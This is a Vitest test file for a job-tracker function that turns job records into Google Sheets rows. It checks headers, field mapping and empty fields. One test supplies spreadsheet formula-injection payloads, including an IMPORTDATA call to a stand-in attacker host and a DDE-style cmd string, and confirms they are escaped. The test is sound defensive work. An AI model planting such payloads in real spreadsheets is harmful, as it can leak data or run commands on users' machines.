import { describe, it, expect } from 'vitest';
import { formatJobsForSheets } from '../googleSheets';
import type { JobRecord } from '../../types';

describe('formatJobsForSheets', () => {
  const sampleJobs: JobRecord[] = [
    {
      id: 'job-1',
      company: 'Acme Corp',
      jobTitle: 'Senior Frontend Engineer',
      status: 'Interviewing',
      dateApplied: '2026-03-01',
      salary: '$160,000 - $190,000',
      location: 'San Francisco, CA',
      industry: 'Enterprise Software',
      summary: 'Frontend role',
      url: 'https://jobs.example.com/acme/123',
      notes: 'Passed initial screening',
      team: 'Platform UI',
      companyMetadata: {},
      positionMetadata: {
        team: 'Platform UI',
        requiredSkills: ['React', 'TypeScript', 'Tailwind CSS'],
      },
      createdAt: '2026-03-01T10:00:00.000Z',
    },
    {
      id: 'job-2',
      company: 'Beta Systems',
      jobTitle: 'Full Stack Developer',
      status: 'Applied',
      dateApplied: '2026-03-05',
      salary: 'Not listed',
      location: 'Remote, US',
      industry: 'FinTech',
      summary: 'Developer role',
      url: 'https://beta.example.com/careers/456',
      companyMetadata: {},
      positionMetadata: {
        requiredSkills: [],
      },
      createdAt: '2026-03-05T12:00:00.000Z',
    },
  ];

  it('generates correct header columns as the first row', () => {
    const rows = formatJobsForSheets(sampleJobs);
    expect(rows[0]).toEqual([
      'Company',
      'Job Title',
      'Team',
      'Status',
      'Date Applied',
      'Salary',
      'Location',
      'Industry',
      'Job URL',
      'Required Skills',
      'Status Duration',
      'Notes',
      'Last Updated',
    ]);
  });

  it('correctly maps and serializes job records to sheet row values', () => {
    const rows = formatJobsForSheets(sampleJobs);
    expect(rows.length).toBe(3); // 1 header + 2 jobs

    const acmeRow = rows[1];
    expect(acmeRow[0]).toBe('Acme Corp');
    expect(acmeRow[1]).toBe('Senior Frontend Engineer');
    expect(acmeRow[2]).toBe('Platform UI');
    expect(acmeRow[3]).toBe('Interviewing');
    expect(acmeRow[4]).toBe('2026-03-01');
    expect(acmeRow[5]).toBe('$160,000 - $190,000');
    expect(acmeRow[6]).toBe('San Francisco, CA');
    expect(acmeRow[7]).toBe('Enterprise Software');
    expect(acmeRow[8]).toBe('https://jobs.example.com/acme/123');
    expect(acmeRow[9]).toBe('React, TypeScript, Tailwind CSS');
    expect(acmeRow[11]).toBe('Passed initial screening');
  });

  it('handles empty/missing fields gracefully', () => {
    const rows = formatJobsForSheets(sampleJobs);
    const betaRow = rows[2];
    expect(betaRow[0]).toBe('Beta Systems');
    expect(betaRow[1]).toBe('Full Stack Developer');
    expect(betaRow[2]).toBe('');
    expect(betaRow[5]).toBe('Not listed');
    expect(betaRow[9]).toBe('');
    expect(betaRow[11]).toBe('');
  });

  it('neutralizes formula trigger characters to prevent Google Sheets formula injection', () => {
    const rows = formatJobsForSheets([
      {
        ...sampleJobs[0],
        company: '=IMPORTDATA("https://evil.example/leak")',
        notes: '+cmd|"/C calc"!A0',
        location: '-1+1',
        team: '@SUM(1,2)',
      },
    ]);
    const row = rows[1];
    expect(row[0]).toBe('\'=IMPORTDATA("https://evil.example/leak")');
    expect(row[2]).toBe("'@SUM(1,2)");
    expect(row[6]).toBe("'-1+1");
    expect(row[11]).toBe('\'+cmd|"/C calc"!A0');
  });
});
